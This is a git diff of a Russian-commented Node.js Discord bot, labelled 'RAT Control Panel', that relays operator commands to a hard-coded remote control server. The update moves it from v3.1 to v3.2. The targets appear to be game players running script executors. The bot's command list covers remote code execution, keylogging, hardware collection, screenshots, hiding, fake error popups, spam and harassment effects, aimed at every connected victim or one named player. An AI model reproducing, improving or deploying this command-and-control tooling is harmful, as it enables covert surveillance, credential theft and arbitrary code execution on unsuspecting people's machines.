@@ -2,46 +2,34 @@ const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
 const fetch = require('node-fetch');
 const express = require('express');
 
-// ========== КОНФИГУРАЦИЯ ==========
 const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
 const SERVER_URL = process.env.SERVER_URL || "https://ratserver-6wo3.onrender.com";
 const PORT = process.env.PORT || 3000;
 
-console.log('🚀 Запуск RAT Discord Bot v3.1...');
-console.log(`🌐 Сервер: ${SERVER_URL}`);
-console.log(`🔑 Токен: ${DISCORD_TOKEN ? '✅ Установлен' : '❌ Отсутствует'}`);
+console.log('🚀 RAT Discord Bot v3.2 запускается...');
 
 if (!DISCORD_TOKEN) {
-    console.error('❌ ОШИБКА: DISCORD_TOKEN не найден в переменных окружения!');
-    console.log('💡 Добавь в Railway Variables:');
-    console.log('DISCORD_TOKEN = твой_токен_бота');
+    console.error('❌ DISCORD_TOKEN не установлен!');
     process.exit(1);
 }
 
-// ========== СОЗДАНИЕ КЛИЕНТА ==========
 const client = new Client({ 
     intents: [
         GatewayIntentBits.Guilds,
         GatewayIntentBits.GuildMessages,
-        GatewayIntentBits.MessageContent,
-        GatewayIntentBits.GuildMembers
+        GatewayIntentBits.MessageContent
     ] 
 });
 
-// ========== HTTP СЕРВЕР ДЛЯ ПРОВЕРКИ ==========
 const app = express();
 
 app.get('/', (req, res) => {
     res.json({
         status: 'online',
-        bot: client.user ? {
-            username: client.user.tag,
-            ready: client.isReady(),
-            uptime: client.uptime
-        } : { ready: false },
+        bot: client.user?.tag || 'starting',
         server: SERVER_URL,
-        timestamp: new Date().toISOString(),
-        version: '3.1.0'
+        version: '3.2.0',
+        timestamp: new Date().toISOString()
     });
 });
 
@@ -49,7 +37,6 @@ app.get('/health', (req, res) => {
     res.send('OK');
 });
 
-// ========== ФУНКЦИИ ==========
 async function sendCommand(command, args = [], target = null) {
     try {
         const payload = { command, args };
@@ -63,15 +50,9 @@ async function sendCommand(command, args = [], target = null) {
             body: JSON.stringify(payload)
         });
         
-        if (!response.ok) {
-            console.error(`❌ Сервер вернул ошибку: ${response.status}`);
-            return false;
-        }
-        
-        console.log(`✅ Команда отправлена успешно`);
-        return true;
+        return response.ok;
     } catch (error) {
-        console.error(`❌ Ошибка отправки:`, error.message);
+        console.error('❌ Ошибка отправки:', error.message);
         return false;
     }
 }
@@ -96,39 +77,25 @@ async function getServerStatus() {
     }
 }
 
-// ========== ОБРАБОТКА КОМАНД ==========
 client.on('ready', () => {
-    console.log('\n' + '='.repeat(50));
-    console.log(`✅ БОТ УСПЕШНО ЗАПУЩЕН!`);
+    console.log(`\n✅ БОТ УСПЕШНО ЗАПУЩЕН!`);
     console.log(`🤖 Имя: ${client.user.tag}`);
-    console.log(`🆔 ID: ${client.user.id}`);
     console.log(`👥 Серверов: ${client.guilds.cache.size}`);
-    console.log(`🌐 Railway URL: ${process.env.RAILWAY_STATIC_URL || 'Не установлен'}`);
-    console.log('='.repeat(50));
-    console.log('\n📝 Доступные команды:');
-    console.log('• /test - Проверка связи');
-    console.log('• /users - Онлайн игроки');
-    console.log('• /status - Статус системы');
-    console.log('• /help - Все команды');
-    console.log('• /kick [игрок] <причина> - Кикнуть игрока');
-    console.log('• /freeze [игрок] <секунды> - Заморозить');
-    console.log('• /cameralock [игрок] <on/off> - Блокировка камеры');
-    console.log('• /jumpscare [игрок] <тип> - Скример');
-    console.log('\n⚡ Бот готов к работе!');
+    console.log(`\n📝 Доступные команды:`);
+    console.log(`• /test - Проверка связи`);
+    console.log(`• /users - Онлайн игроки`);
+    console.log(`• /status - Статус системы`);
+    console.log(`• /help - Все команды (27 функций)`);
+    console.log(`\n⚡ Бот готов к работе!`);
     
-    client.user.setActivity('/help | RAT v3.1', { type: 'PLAYING' });
+    client.user.setActivity('/help | RAT v3.2', { type: 'PLAYING' });
 });
 
 client.on('messageCreate', async message => {
-    // Игнорируем сообщения от ботов
-    if (message.author.bot) return;
+    if (message.author.bot || !message.content.startsWith('/')) return;
     
-    // Проверяем что сообщение начинается с /
-    if (!message.content.startsWith('/')) return;
+    console.log(`💬 Команда от ${message.author.tag}: ${message.content}`);
     
-    console.log(`\n💬 Команда от ${message.author.tag}: ${message.content}`);
-    
-    // Убираем / и разбиваем на части
     const args = message.content.slice(1).split(' ');
     const command = args.shift().toLowerCase();
     
@@ -136,126 +103,146 @@ client.on('messageCreate', async message => {
     let target = null;
     const firstArg = args[0];
     
-    // Простая проверка на ник (3-20 символов, буквы/цифры/_)
     if (firstArg && /^[a-zA-Z0-9_]{3,20}$/.test(firstArg)) {
         target = args.shift();
     }
     
     try {
-        // 🎯 ОСНОВНЫЕ КОМАНДЫ
-        if (command === 'test') {
-            if (await sendCommand("popup", ["✅ Тест от Discord бота!"], target)) {
-                await message.reply(`✅ Тест отправлен ${target ? `игроку **${target}**` : '**всем игрокам**'}!`);
-            } else {
-                await message.reply('❌ Ошибка отправки теста. Проверьте сервер.');
-            }
-        }
-        
-        else if (command === 'users') {
-            const data = await getOnlineUsers();
-            
-            const embed = new EmbedBuilder()
-                .setTitle('👥 Онлайн игроки')
-                .setColor(0x00ff00);
-            
-            if (data.count > 0) {
-                embed.setDescription(`**Всего онлайн:** ${data.count}`);
-                
-                const userList = data.users.slice(0, 15).map(u => 
-                    `• **${u.player}** - ${u.place || 'Unknown'} (${u.executor || 'Unknown'})`
-                ).join('\n');
-                
-                embed.addFields({
-                    name: 'Список игроков:',
-                    value: userList + (data.users.length > 15 ? `\n\n... и еще ${data.users.length - 15} игроков` : '')
-                });
-            } else {
-                embed.setDescription('❌ Нет активных игроков');
-                embed.setColor(0xff0000);
-            }
-            
-            await message.reply({ embeds: [embed] });
-        }
-        
-        else if (command === 'status') {
-            const data = await getServerStatus();
-            
-            if (!data) {
-                await message.reply('❌ Не удалось получить статус сервера');
-                return;
-            }
-            
-            const embed = new EmbedBuilder()
-                .setTitle('📊 Статус системы RAT v3.1')
-                .setColor(0x7289da)
-                .addFields(
-                    { name: '🌐 Сервер API', value: data.status === 'online' ? '🟢 Онлайн' : '🔴 Офлайн', inline: true },
-                    { name: '👥 Онлайн игроков', value: `\`${data.online_users || 0}\``, inline: true },
-                    { name: '📨 Очередь команд', value: `\`${data.pending_commands || 0}\``, inline: true },
-                    { name: '📊 Версия', value: '`3.1.0`', inline: true },
-                    { name: '🔗 Ссылка', value: `[Открыть](${SERVER_URL})`, inline: true }
-                );
-            
-            await message.reply({ embeds: [embed] });
-        }
-        
-        else if (command === 'help') {
-            const embed = new EmbedBuilder()
-                .setTitle('🤖 RAT Control Panel v3.1')
-                .setDescription('**Формат:** `/команда [игрок] <аргументы>`\n**Пример:** `/freeze PlayerName 10`')
-                .setColor(0x7289da)
-                .addFields(
-                    { 
-                        name: '🎯 Основные команды', 
-                        value: '`/test` - проверка связи\n`/users` - онлайн игроки\n`/status` - статус системы\n`/help` - эта справка' 
-                    },
-                    { 
-                        name: '👤 Управление игроком', 
-                        value: '`/kick [ник] <причина>`\n`/freeze [ник] <секунды>`\n`/void [ник]`\n`/spin [ник]`\n`/fling [ник]`' 
-                    },
-                    { 
-                        name: '📷 Камерные команды', 
-                        value: '`/cameralock [ник] <on/off>`\n`/camerashake [ник] <сек> <сила>`' 
-                    },
-                    { 
-                        name: '👻 Скримеры', 
-                        value: '`/jumpscare [ник] <тип>`\n**Типы:** 1=Джефф Килер, 2=Соник.exe' 
-                    },
-                    { 
-                        name: '🔊 Аудио/Видео', 
-                        value: '`/mute [ник]`\n`/unmute [ник]`\n`/playaudio [ник] <id>`\n`/blur [ник] <сек>`' 
-                    },
-                    { 
-                        name: '💬 Чат', 
-                        value: '`/chat [ник]`\n`/message [ник] <текст>`' 
-                    }
-                )
-                .setFooter({ text: `Всего команд: 27 | Сервер: ${SERVER_URL}` });
-            
-            await message.reply({ embeds: [embed] });
-        }
-        
-        // 🎯 ВСЕ ОСТАЛЬНЫЕ КОМАНДЫ
-        else {
-            const validCommands = [
-                'kick', 'freeze', 'void', 'spin', 'fling', 'sit', 'dance',
-                'mute', 'unmute', 'playaudio', 'blur', 'chat', 'message',
-                'jumpscare', 'cameralock', 'camerashake', 'execute', 'fakeerror',
-                'keylog', 'stopkeylog', 'hardware', 'hide', 'memory', 'gallery',
-                'screenshot', 'print'
-            ];
-            
-            if (validCommands.includes(command)) {
-                console.log(`⚡ Отправка команды: ${command}, аргументы: ${args}, цель: ${target}`);
-                
-                if (await sendCommand(command, args, target)) {
-                    await message.reply(`✅ Команда \`${command}\` отправлена ${target ? `игроку **${target}**` : '**всем игрокам**'}`);
+        switch (command) {
+            case 'test':
+                if (await sendCommand("popup", ["✅ Тест от Discord бота!"], target)) {
+                    await message.reply(`✅ Тест отправлен ${target ? `игроку **${target}**` : '**всем игрокам**'}!`);
                 } else {
-                    await message.reply('❌ Ошибка отправки команды. Проверьте подключение к серверу.');
+                    await message.reply('❌ Ошибка отправки теста');
                 }
-            } else {
-                await message.reply(`❌ Неизвестная команда \`${command}\`. Используйте \`/help\` для списка команд.`);
-            }
+                break;
+                
+            case 'users':
+                const userData = await getOnlineUsers();
+                
+                const userEmbed = new EmbedBuilder()
+                    .setTitle('👥 Онлайн игроки')
+                    .setColor(0x00ff00);
+                
+                if (userData.count > 0) {
+                    userEmbed.setDescription(`**Всего онлайн:** ${userData.count}`);
+                    
+                    const userList = userData.users.slice(0, 10).map(u => 
+                        `• **${u.player}** - ${u.place || 'Unknown'}`
+                    ).join('\n');
+                    
+                    userEmbed.addFields({
+                        name: 'Список игроков:',
+                        value: userList + (userData.users.length > 10 ? `\n\n... и еще ${userData.users.length - 10} игроков` : '')
+                    });
+                } else {
+                    userEmbed.setDescription('❌ Нет активных игроков');
+                    userEmbed.setColor(0xff0000);
+                }
+                
+                await message.reply({ embeds: [userEmbed] });
+                break;
+                
+            case 'status':
+                const statusData = await getServerStatus();
+                
+                if (!statusData) {
+                    await message.reply('❌ Не удалось получить статус сервера');
+                    return;
+                }
+                
+                const statusEmbed = new EmbedBuilder()
+                    .setTitle('📊 Статус системы RAT v3.2')
+                    .setColor(0x7289da)
+                    .addFields(
+                        { name: '🌐 Сервер API', value: statusData.status === 'online' ? '🟢 Онлайн' : '🔴 Офлайн', inline: true },
+                        { name: '👥 Онлайн игроков', value: `\`${statusData.online_users || 0}\``, inline: true },
+                        { name: '📨 Очередь команд', value: `\`${statusData.pending_commands || 0}\``, inline: true },
+                        { name: '📊 Версия', value: '`3.2.0`', inline: true },
+                        { name: '🔗 Ссылка', value: `[Открыть](${SERVER_URL})`, inline: true },
+                        { name: '🤖 Discord бот', value: statusData.discord_bot?.status === 'online' ? '🟢 Активен' : '🔴 Неактивен', inline: true }
+                    )
+                    .setFooter({ text: 'RAT Control System | 27 команд доступно' });
+                
+                await message.reply({ embeds: [statusEmbed] });
+                break;
+                
+            case 'help':
+                const helpEmbed = new EmbedBuilder()
+                    .setTitle('🤖 RAT Control Panel v3.2')
+                    .setDescription('**Полный список всех команд с поддержкой таргетинга**')
+                    .setColor(0x7289da)
+                    .addFields(
+                        { 
+                            name: '🎯 Формат команд:', 
+                            value: '• `/команда` - для всех игроков\n• `/команда ник` - для конкретного игрока\n• `/команда ник аргументы` - с параметрами\n\n**Примеры:**\n`/fakeerror текст` - для всех\n`/fakeerror PlayerName текст` - для игрока\n`/cameralock on` - для всех\n`/cameralock PlayerName off` - для игрока', 
+                            inline: false 
+                        },
+                        { 
+                            name: '👤 Управление игроком', 
+                            value: '`/kick [ник] <причина>`\n`/freeze [ник] <секунды>`\n`/void [ник]`\n`/spin [ник]`\n`/fling [ник]`\n`/sit [ник]`\n`/dance [ник]`\n`/cameralock [ник] <on/off>`\n`/camerashake [ник] <секунды> <интенсивность>`', 
+                            inline: false 
+                        },
+                        { 
+                            name: '🔊 Аудио/Видео', 
+                            value: '`/mute [ник]`\n`/unmute [ник]`\n`/playaudio [ник] <id>`\n`/blur [ник] <секунды>`\n`/screenshot [ник]`', 
+                            inline: false 
+                        },
+                        { 
+                            name: '💬 Чат', 
+                            value: '`/chat [ник]`\n`/message [ник] <текст>`', 
+                            inline: false 
+                        },
+                        { 
+                            name: '👻 Скримеры', 
+                            value: '`/jumpscare [ник] <тип>`\n**Типы:** 1=Джефф Килер, 2=Соник.exe', 
+                            inline: false 
+                        },
+                        { 
+                            name: '⚙️ Системные', 
+                            value: '`/execute [ник] <код>`\n`/fakeerror [ник] <текст>`\n`/keylog [ник]`\n`/stopkeylog [ник]`\n`/hardware [ник]`\n`/hide [ник]`', 
+                            inline: false 
+                        },
+                        { 
+                            name: '💥 Spam', 
+                            value: '`/memory [ник] <кол-во>`\n`/gallery [ник] <кол-во>`', 
+                            inline: false 
+                        },
+                        { 
+                            name: '👥 Информация', 
+                            value: '`/users` - онлайн игроки\n`/status` - статус системы\n`/test` - тест\n`/print` - проверка связи', 
+                            inline: false 
+                        }
+                    )
+                    .setFooter({ text: `Всего команд: 27 | Сервер: ${SERVER_URL} | Версия: 3.2.0` });
+                
+                await message.reply({ embeds: [helpEmbed] });
+                break;
+                
+            case 'print':
+                if (await sendCommand("print", [], target)) {
+                    await message.reply(`✅ Проверка связи отправлена ${target ? `игроку **${target}**` : '**всем игрокам**'}`);
+                }
+                break;
+                
+            default:
+                const validCommands = [
+                    'kick', 'freeze', 'void', 'spin', 'fling', 'sit', 'dance',
+                    'mute', 'unmute', 'playaudio', 'blur', 'chat', 'message',
+                    'jumpscare', 'cameralock', 'camerashake', 'execute', 'fakeerror',
+                    'keylog', 'stopkeylog', 'hardware', 'hide', 'memory', 'gallery',
+                    'screenshot'
+                ];
+                
+                if (validCommands.includes(command)) {
+                    if (await sendCommand(command, args, target)) {
+                        await message.reply(`✅ Команда \`${command}\` отправлена ${target ? `игроку **${target}**` : '**всем игрокам**'}`);
+                    } else {
+                        await message.reply('❌ Ошибка отправки команды');
+                    }
+                } else {
+                    await message.reply(`❌ Неизвестная команда \`${command}\`. Используйте \`/help\``);
+                }
         }
     } catch (error) {
         console.error('❌ Ошибка обработки команды:', error);
@@ -263,40 +250,15 @@ client.on('messageCreate', async message => {
     }
 });
 
-// ========== ЗАПУСК ПРИЛОЖЕНИЯ ==========
-async function start() {
+app.listen(PORT, async () => {
+    console.log(`🌐 HTTP сервер запущен на порту ${PORT}`);
+    
     try {
-        // Запускаем HTTP сервер
-        app.listen(PORT, () => {
-            console.log(`🌐 HTTP сервер запущен на порту ${PORT}`);
-            console.log(`🔗 Health check доступен по: http://localhost:${PORT}/`);
-            console.log(`📡 Railway URL: ${process.env.RAILWAY_STATIC_URL || 'Будет доступен после деплоя'}`);
-        });
-        
-        // Запускаем Discord бота
         await client.login(DISCORD_TOKEN);
-        
-        console.log('\n✨ ВСЁ ГОТОВО! Бот запущен успешно!');
-        console.log('📡 Бот будет онлайн 24/7 на Railway');
-        
+        console.log('✨ Бот успешно запущен!');
+        console.log(`📡 Railway URL: ${process.env.RAILWAY_STATIC_URL || 'Доступен в настройках Railway'}`);
     } catch (error) {
-        console.error('❌ ФАТАЛЬНАЯ ОШИБКА ЗАПУСКА:', error.message);
-        console.error('💡 Проверь:');
-        console.error('1. Правильный ли Discord токен');
-        console.error('2. Включены ли интенты в настройках бота');
-        console.error('3. Добавлен ли бот на сервер Discord');
+        console.error('❌ Ошибка входа в Discord:', error.message);
         process.exit(1);
     }
-}
-
-// Запускаем приложение
-start();
-
-// Обработка ошибок
-process.on('uncaughtException', (err) => {
-    console.error('❌ Необработанное исключение:', err);
-});
-
-process.on('unhandledRejection', (reason, promise) => {
-    console.error('❌ Необработанный промис:', reason);
 });
